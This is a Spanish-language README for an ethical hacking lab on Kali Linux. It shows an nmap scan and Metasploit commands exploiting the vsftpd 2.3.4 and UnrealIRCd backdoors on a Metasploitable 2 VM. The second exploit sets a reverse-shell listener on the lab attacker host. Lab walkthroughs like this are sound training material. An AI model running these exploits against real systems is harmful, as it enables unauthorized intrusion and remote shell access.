# LAB HACK ET 1 – Laboratorio de Hacking Ético con Kali y Metasploitable 2 🧪

## Descripción
Este laboratorio demuestra el uso de herramientas como `nmap` y `Metasploit` para realizar pruebas de penetración en un entorno controlado usando:

- Kali Linux como máquina atacante
- Metasploitable 2 como máquina víctima

## Herramientas
- Kali Linux 2025.2
- Metasploitable 2
- VMware Workstation
- nmap
- Metasploit Framework (msfconsole)

## Fases

### Fase 1 – Reconocimiento con nmap
```bash
nmap -sS -sV -O 192.168.20.129 -oN scan1.txt

### Fase 2 – Explotación

### Exploit 1: vsftpd 2.3.4 Backdoor

use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.20.129
run

### Exploit 2: UnrealIRCd Backdoor

use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.20.129
set LHOST 192.168.20.128
set LPORT 4444
run

## Evidencias

Las evidencias se encuentran en el archivo PDF LAB_HACK_ET_1.pdf y en la carpeta evidencias/.

## Conclusiones

    Se logró comprometer completamente la máquina víctima.

    Se aplicaron técnicas básicas de pentesting con herramientas estándar.

    Buen ejemplo de práctica en laboratorio cerrado y ético.
